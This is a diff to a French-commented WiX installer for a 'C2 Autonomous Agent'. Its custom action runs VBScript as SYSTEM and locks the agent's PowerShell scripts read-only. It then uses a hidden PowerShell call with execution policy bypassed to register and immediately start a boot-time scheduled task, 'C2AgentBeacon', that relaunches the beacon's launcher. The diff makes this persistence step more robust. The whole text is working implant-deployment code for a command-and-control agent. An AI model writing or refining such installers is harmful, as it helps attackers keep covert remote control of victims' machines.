@@ -22,7 +22,6 @@
         <!-- Feature principale -->
         <Feature Id="ProductFeature" Title="C2 Autonomous Agent" Level="1">
             <ComponentRef Id="AgentExecutable" />
-            <!-- ConfigFile reference removed -->
             <ComponentRef Id="LauncherScript" />
             <ComponentRef Id="InstallFolder" />
             <ComponentRef Id="ApplicationShortcuts" />
@@ -80,45 +79,53 @@
             </Component>
         </DirectoryRef>
 
-        <!-- Custom Action pour valider et sécuriser les scripts après installation -->
+        <!-- Custom Action pour sécuriser les scripts et créer la tâche planifiée de façon fiable -->
         <CustomAction Id="SecureScripts" 
                       Script="vbscript"
                       Execute="deferred"
                       Impersonate="no"
-                      Return="ignore">
+                      Return="check">
             <![CDATA[
             On Error Resume Next
             Set objFSO = CreateObject("Scripting.FileSystemObject")
             Set objShell = CreateObject("WScript.Shell")
+
             Dim installPath
             installPath = "C:\Program Files\C2Agent"
-            
-            ' 1. Vérifier que les scripts existent
+
+            ' 1. Vérifier que les scripts existent et les marquer en lecture seule
             If objFSO.FileExists(installPath & "\agent_active.ps1") Then
                 Set objFile = objFSO.GetFile(installPath & "\agent_active.ps1")
-                objFile.Attributes = objFile.Attributes Or 1 ' ReadOnly
+                objFile.Attributes = objFile.Attributes Or 1
             End If
-            
+
             If objFSO.FileExists(installPath & "\launcher.ps1") Then
                 Set objFile = objFSO.GetFile(installPath & "\launcher.ps1")
-                objFile.Attributes = objFile.Attributes Or 1 ' ReadOnly
+                objFile.Attributes = objFile.Attributes Or 1
             End If
-            
-            ' 2. Créer la tâche planifiée si elle n'existe pas
-            Dim taskExistsCmd, execCmd
-            taskExistsCmd = "powershell.exe -Command ""Get-ScheduledTask -TaskName 'C2AgentBeacon' -ErrorAction SilentlyContinue"""
-            
-            ' Créer la tâche planifiée au démarrage
-            Dim createTaskCmd
-            createTaskCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command """ & _
-                           "$taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File " & chr(34) & installPath & "\launcher.ps1" & chr(34) & "';" & _
-                           "$taskTrigger = New-ScheduledTaskTrigger -AtStartup;" & _
-                           "$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries;" & _
-                           "$task = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description 'C2 Agent Beacon - Starts at boot';" & _
-                           "Register-ScheduledTask -TaskName 'C2AgentBeacon' -TaskPath '\' -InputObject $task -Force -ErrorAction SilentlyContinue" & _
-                           """"""
-            
-            objShell.Run createTaskCmd, 0, True
+
+            ' 2. Créer ou remplacer la tâche planifiée puis la démarrer immédiatement
+            Dim psCommand
+            psCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command """ & _
+                        "$ErrorActionPreference='Stop'; " & _
+                        "$taskName='C2AgentBeacon'; " & _
+                        "$launcherPath = Join-Path 'C:\\Program Files\\C2Agent' 'launcher.ps1'; " & _
+                        "if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue }; " & _
+                        "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File \"$launcherPath\"'; " & _
+                        "$trigger = New-ScheduledTaskTrigger -AtStartup; " & _
+                        "$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew; " & _
+                        "$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Description 'C2 Agent Beacon - Starts at boot'; " & _
+                        "Register-ScheduledTask -TaskName $taskName -TaskPath '\\' -InputObject $task -Force | Out-Null; " & _
+                        "Start-ScheduledTask -TaskName $taskName -ErrorAction Stop; " & _
+                        "Write-Output 'C2AgentBeacon scheduled task created and started successfully.'; " & _
+                        """"
+
+            Dim exitCode
+            exitCode = objShell.Run(psCommand, 0, True)
+
+            If exitCode <> 0 Then
+                WScript.Quit exitCode
+            End If
             ]]>
         </CustomAction>
 
